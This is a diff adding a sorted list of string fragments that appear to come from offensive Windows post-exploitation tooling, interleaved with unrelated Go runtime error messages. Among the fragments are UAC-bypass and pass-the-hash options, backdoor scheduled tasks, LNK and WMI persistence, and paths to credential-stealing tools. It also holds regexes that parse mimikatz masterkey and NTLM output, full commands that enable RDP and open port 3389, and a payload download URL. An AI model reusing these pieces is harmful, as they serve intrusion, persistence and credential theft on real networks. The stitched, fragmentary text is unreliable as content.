@@ -1,0 +1,389 @@
+"' + """
+"' + ""$File"" + "
+"' -ArgumentList $HKU,"
+"' -Filter ""Drive="
+"'"" + "
+"'"""
+"'""$EventRecordID"""
+"'""$IpAddress"""
+"'"", ""OKOnly,MsgBoxSetForeground,SystemModal,Exclamation"", """")"
+"'', @(""$3["
+"'', @(""--AddComputerTask --TaskName \""$3["
+"'', @(""--AddLocalAdmin --UserAccount $3["
+"'', @(""--AddTask $3["
+"'', @(""--AddUserRights --UserRights \""$3["
+"'', @(""--AddUserScript --ScriptName $3["
+"'', @(""--GetRunning $3["
+"'', @(""--ListAll $3["
+"'', @(""--RemoveTask $3["
+"'', @(""-group="",$3["
+"'', @(""-m="",$3["
+"'', @(""-t schtask -c \""C:\\Windows\\System32\\cmd.exe\"" -a \""/c $3["
+"'', @(""-t schtaskbackdoor -c \""C:\\Windows\\System32\\cmd.exe\"" -a \""/c $3["
+"'', @(""-t service -c \""C:\\Windows\\System32\\cmd.exe\"" -a \""/c $3["
+"'', @(""action=BackdoorLNK command=\""$3["
+"'', @(""action=CreateService servicename=$3["
+"'', @(""action=NewLNK filepath=\""$3["
+"'', @(""action=WMIEventSub command=\""$3["
+"'', @(""action=create keyvalue="",$3["
+"'', @(""encrypt $3["
+"'', @(""install /command:"",$3["
+"'', @(""install /url:"",$3["
+"'',@("""",$3["
+"',  @(""Get-Content"",$3["
+"',  @(""Get-Process -ComputerName"",$3["
+"',  @(""Resolve-DnsName"",$3["
+"',  @(""copy"",$3["
+"',  @(""gc"",$3["
+"',  @(""wget"",$3["
+"',  @($3["
+"', @(""-b"",$3["
+"', @(""-c"",$3["
+"', @(""-d"",$3["
+"', @(""-h"",$3["
+"', @(""-i"",$3["
+"', @(""-u"",$3["
+"', @(""BypassUac"",$3["
+"', @(""GetSystem"",$3["
+"', @(""RegAuto"",$3["
+"', @(""action=create keyvalue="",$3["
+"', @(""check"",$3 ["
+"', @(""gethtml"",$3["
+"', @(""pth"",$3["
+"', @(""read"",$3 ["
+"', @(""sheets"",$3 ["
+"', @($3 ["
+"', @($3["
+"', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;`$playerName = `"
+"', `"
+"'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("""
+"'] --Command \""$3["
+"'] --GPOName \""$3["
+"'] --ScriptContents \""$3["
+"'] -outputfile=\""$3["
+"'] -t \""$3["
+"'] \""$3["
+"'] command=\""$3["
+"']"", ""$3["
+"']"",""/path:$3["
+"']"",""/sid:$3["
+"'], ""/user:$3["
+"'], $3["
+"'],"" "",""-c="",$3["
+"'],"" "",""-d="",$3["
+"'],"" "",""-e="",$3["
+"'],"" "",""-f="",$3["
+"'],"" "",""-i="",$3["
+"'],"" "",""-p="",$3["
+"'],"" "",""-u="",$3["
+"'],"""",$3["
+"'],""--Delay"",$3["
+"'],""--Sleep"",$3["
+"'],""-OutFile"",$3["
+"'],""-Password"",$3["
+"'],""-Username"",$3["
+"'],""-c"",""$3["
+"'],""-e"",$3["
+"'],""-g"",$3["
+"'],""-host"",$3["
+"'],""-o"",$3["
+"'],""-p"",$3["
+"'],""-t"",$3["
+"'],""-u"",$3["
+"'],""cmd"",$3["
+"'],""upload"",$3["
+"'],$3 ["
+"'],$3["
+"']\"" $3["
+"']\"" --Arguments \""$3["
+"']\"" --Author $3["
+"']\"" --GPOName \""$3["
+"']\"" --UserAccount $3["
+"']\"" -m add -o $3["
+"']\"" -n \""$3["
+"']\"" eventname=$3["
+"']\"" lnkicon=\""$3["
+"']\"" lnkname=\""$3["
+"']\"" lnkpath=\""$3["
+"']\"" lnktarget=\""$3["
+"'cmd.exe /c REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" /v fDenyTSConnections /t REG_DWORD /d 0 /f\"
+"'cmd.exe /c REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" /v fDenyTSConnections /t REG_DWORD /d 1 /f\"
+"'cmd.exe /c netsh advfirewall firewall add rule name=\""Remote Desktop\"" protocol=TCP dir=in localport=3389 action=allow\"
+"'powershell -nop -exec bypass -c """
+"'t happeninternal error - misuse of itabmalformed time zone informationnon in-use span in unswept listpacer: sweep done at heap size reflect: Len of non-array type reflect: NumIn of non-func typeresetspinning: not a spinning mruntime: cannot allocate memoryruntime: split stack overflow: shared library version mismatchslice bounds out of range [%x:]slice bounds out of range [:%x] (types from different packages)28421709430404007434844970703125MapIter.Value called before NextSIGFPE: floating-point exceptionSIGTTOU: background write to tty"" not supported for cpu option ""can"
+"'t send after socket shutdowncrypto/aes: input not full blockend outside usable address spacemheap.allocSpan called with no Pnon-Go code disabled sigaltstacknumerical argument out of domainpanic while printing panic valuereflect.nameFrom: tag too long: reflect: NumIn of non-func type reflect: NumOut of non-func typeremovespecial on invalid pointerresource temporarily unavailableruntime: mcall function returnedruntime: newstack called from g=runtime: root level max pages = runtime: stack split at bad timeruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prevscanstack: goroutine not stoppedslice bounds out of range [%x::]slice bounds out of range [:%x:]slice bounds out of range [::%x]software caused connection abortsweep increased allocation countuse of closed network connection of method on nil interface value142108547152020037174224853515625710542735760100185871124267578125GODEBUG: no value specified for ""SIGCHLD: child status has changedSIGTTIN: background read from ttySIGXFSZ: file size limit exceededbase outside usable address spaceconcurrent map read and map writecrypto/aes: output not full blockfindrunnable: negative nmspinningfreeing stack not in a stack spanheapBitsSetType: unexpected shiftinappropriate file type or formatmin must be a non-zero power of 2misrounded allocation in sysAllocoperation not supported by deviceoperation not supported on socketreflect.nameFrom: name too long: reflect: Field index out of rangereflect: NumOut of non-func type reflect: array index out of rangereflect: chanDir of non-chan typereflect: slice index out of rangeruntime: castogscanstatus oldval=runtime: failed mSpanList.insert runtime: goroutine stack exceeds runtime: memory allocated by OS [runtime: name offset out of rangeruntime: text offset out of rangeruntime: type offset out of rangeslice bounds out of range [%x:%y]stackalloc not on scheduler stackstoplockedm: inconsistent lockingsync: RUnlock of unlocked RWMutextoo many levels of remote in pathtoo many levels of symbolic linkstoo many references: can"
+'	 \* GUID      :	(.*)
+'	 \* MasterKey :	(.*)
+'	 \* MasterKey :
+'	 \* Time      :	.*
+'	 \* sha1\(key\) :	(.*)
+'	 \[\d+\]
+' 
+' $+ $3[
+' + $remote_command + 
+' + struct.pack(
+' -Class 
+' -Name 
+' -Value $fctenc -PropertyType String -Force
+' . $1 . 
+' AND Extension=
+' AND FileName=
+' AND Path=
+' AND extension=
+' OR extension=
+' UTF-16 LE happens to be VBScript
+' \*
+' encoding=
+' manifestVersion=
+' standalone=
+' uiAccess=
+'#(=
+'$1 $2 $3 $bid $DumpKeys $UseAllKeys
+'$1 $2 $beaconId $output $hostname $State $line $UserName $Domain $guid $masterkey $sha1 $STATE_ScanningForHeader $STATE_ParsingHeader $STATE_ScanningForKeyHeader $STATE_ParsingKeys
+'$1 $2 $bid %cred @masterkeys
+'$1 $bid @masterkeys $UseAllKeys $command
+'$3[
+'$NCpath $NCip $NCport
+'$Name
+'$Name $Path
+'$Name $port
+'$Name $port $username $password $type $thread
+'$Prefix $File
+'$Prefix $File $Key $Item $Reg
+'$SharpDPAPI::AssemblyPath
+'$args
+'$bid
+'$bid $pipename $spawn $offset $padding $patched $dllbytes $file $builder $pid $pipenameW
+'$dialog %defaults
+'$fct = Get-Content -Encoding byte -Path 
+'$fullregistrypath
+'$host $user $pass $command $GETRES
+'$host $user $pass $localpath $remotepath
+'$hostname $account $domain $ntlm $sha1 $dpapi $password $length $guid $source
+'$lhost $rhost $hex
+'$mypipe $pipename $builder
+'$npipeName`
+'$payload $fname
+'$port $path $user $pass $permission
+'$registrydownname
+'$script
+'$script $oneliner
+'$server $vkey
+'$shellcode $arch $program $exe $parm
+'$stager $arch $dll
+'$stager $winbuild
+'$targets
+'%COMPUTERNAME%
+'%options $script $url $arch
+''
+'' -ComputerName $RemoteComputer @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 
+'();
+'(Session|Logon Server|Logon Time)\W+: .*
+') and (EventID !=
+') eq 
+'.`
+'.sdtid
+'//FileZilla3/Servers/Server
+'/script/BrowserGhost.exe
+'/script/DecryptAutoLogon.exe
+'/script/DecryptTeamViewer.exe
+'/script/Gopher.exe
+'/script/Ladon.exe
+'/script/ListRDPConnections.exe
+'/script/NoAmci.exe
+'/script/NoPowerShell.exe
+'/script/SessionSearcher.exe
+'/script/SharpChromium.exe
+'/script/SharpDPAPI.exe
+'/script/SharpDump.exe
+'/script/SharpSpray1.exe
+'/script/SharpWeb.exe
+'/script/SharpWifiGrabber.exe
+'/script/SharpXDecrypt.exe
+'/script/SolarFlare.exe
+'/script/StickyNotesExtract.exe
+'/script/certexp.exe
+'/script/napwd.exe
+'1.0
+'10.0
+'1024
+'1149
+'131
+'140
+'21
+'22
+'24
+'25
+'6.1
+'6.2
+'6.3
+'; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path 
+';`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(`
+'@
+'@masterkeys $out $bid
+'Arguments
+'Authentication Id :.*
+'Author
+'C:
+'CIM_DataFile
+'CallBackFile
+'ClientActiveXCore
+'Command
+'Credential
+'Delay
+'DeleteValue
+'Domain            : (.*)
+'Dylan Davis <dylan.davis@risksense.com>
+'EnumKey
+'EventLogType
+'GETRES
+'GPOName
+'GetStringValue
+'HT$08J
+'IpAddress
+'Keyword
+'LocalSessionManager
+'Microsoft-Windows-TerminalServices-LocalSessionManager/operational
+'N(=
+'NCip
+'NCpath
+'NCport
+'Ni
+'Or
+'OutFile
+'Path
+'PowerShell Get-WinEvent cmdlet Error.
+'RdpCoreTS
+'RegItem
+'RegKey
+'RemoteConnectionManager
+'Result: Null
+'ReverseTcp
+'S-1-5-21-[\d\-]+$
+'SID               : .*
+'ScriptContents
+'ScriptName
+'Security
+'SerName
+'Sessions
+'Sleep
+'StdRegProv
+'System.Core`
+'Taskname
+'Type
+'UTF-8
+'UploadPath
+'User Name         : (.*)
+'UserAccount
+'UserRights
+'Username : (.*).*[\n\r].*Domain   : (.*)[\n\r].*NTLM.*[\n\r].*SHA1     : (.*)[\n\r].*DPAPI    : (.*)[\n\r]
+'Win32_PerfFormattedData_PerfOS_System
+'Windows
+'XML
+'\0
+'\\Users\\$MappedUserName\\AppData\\Roaming\\FileZilla\\
+'\\Users\\$MappedUserName\\Documents\\SuperPuTTY\\
+'\{[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}\}:.*
+'] $+ 
+'] $3[
+'] /password:$3[
+'] /user:$3[
+'] RDTOGGLE WHERE ServerName=\
+'] \\ $3[
+'] attime=$3[
+'] process call create \
+']!=
+']\
+'^HKEY_USERS\\S-1-5-21-[\d\-]+$
+'args
+'arguments
+'asInvoker
+'attime
+'b
+'barch
+'cmd
+'cmdpath
+'command
+'computername
+'content
+'dTc
+'domain
+'downPath
+'enable
+'eventlog
+'eventname
+'exec
+'false
+'file
+'filename
+'filepath
+'g(.
+'group
+'groupname
+'groups
+'hex
+'host
+'hostname
+'http://10.1.1.10:80/a
+'http://google.com
+'id
+'ip
+'iptype
+'lhost
+'listener
+'lnkicon
+'lnkname
+'lnkpath
+'lnktarget
+'localpath
+'modifytime
+'msg
+'name
+'outfile
+'outpath
+'pass
+'passwd
+'password
+'path
+'payload
+'permission
+'pid
+'ping`
+'port
+'ports
+'ppk
+'rdp
+'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe
+'remotepath
+'rhost
+'root\default
+'s contents to the remote computer
+'s enumerate the $3[
+'schtask_name
+'schtask_time
+'schtasks_description
+'schtasks_name
+'server
+'service
+'service_name
+'servicename
+'sessionpath
+'sheetname
+'sid
+'sitemanager
+'t
+'target
+'targets
+'thread
+'time
+'true
+'type
+'u
+'url
+'urn:schemas-microsoft-com:asm.v1
+'user
+'username
+'vkey
+'x64
+'yes
+'{0:X}
